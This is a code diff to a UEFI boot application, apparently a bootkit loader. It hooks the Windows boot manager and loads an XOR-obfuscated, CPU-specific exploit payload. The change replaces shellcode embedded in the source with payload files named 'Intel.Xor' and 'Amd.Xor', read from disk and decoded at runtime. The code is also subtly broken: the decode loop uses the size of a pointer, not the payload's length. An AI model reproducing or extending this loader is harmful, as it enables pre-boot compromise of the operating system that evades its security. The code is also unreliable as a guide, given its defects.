@@ -6,7 +6,6 @@
 #include "PeStructs.h"
 #include "BootMgfw.h"
 #include "Exploit.h"
-#include "ExpShell.h"
 #include <intrin.h>
 
 #include "FileSystem/FileSystem.h"
@@ -72,20 +71,28 @@ EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable
     }
 
     CpuVendor CupType = GetCPUVendor();
+    CHAR16* shellName = NULL;
     if (CupType == Intel)
+        shellName = L"\\Intel.Xor";
+    else if (CupType == AMD)
+        shellName = L"\\Amd.Xor";
+    else
+        return EFI_UNSUPPORTED;
+
+    VOID* buffer = NULL;
+    UINTN shellSize = 0;
+    if (EFI_ERROR(Status = ReadFile(shellName, &shellSize, buffer)))
     {
-        for (UINT32 i = 0; i < sizeof(IntelShell); i++)
-            IntelShell[i] = (UINT8)(IntelShell[i] ^ ((i + 7 * i + 8) + 4 + i));
-
-        ExpLoad = (UINT8*)IntelShell;
-    } else if (CupType == AMD) {
-        for (UINT32 i = 0; i < sizeof(AmdShell); i++)
-            AmdShell[i] = (UINT8)(AmdShell[i] ^ ((i + 7 * i + 8) + 4 + i));
-
-        ExpLoad = (UINT8*)AmdShell;
+        Print(L"ERORR6: %r\n", Status);
+        gBS->Stall(SEC_TO_MS(5));
+        return EFI_ABORTED;
     }
-      
-    //Print(L"CPU: %u -> %u\n", GetCPUVendor(), Index);
+
+    UINT8* shellBuffer = buffer;
+    for (UINT32 i = 0; i < sizeof(shellBuffer); i++)
+        shellBuffer[i] = (UINT8)(shellBuffer[i] ^ ((i + 7 * i + 8) + 4 + i));
+
+    ExpLoad = shellBuffer;
 
     if (EFI_ERROR((Status = InstallBootMgfwHooks(BootMgfwHandle))))
     {
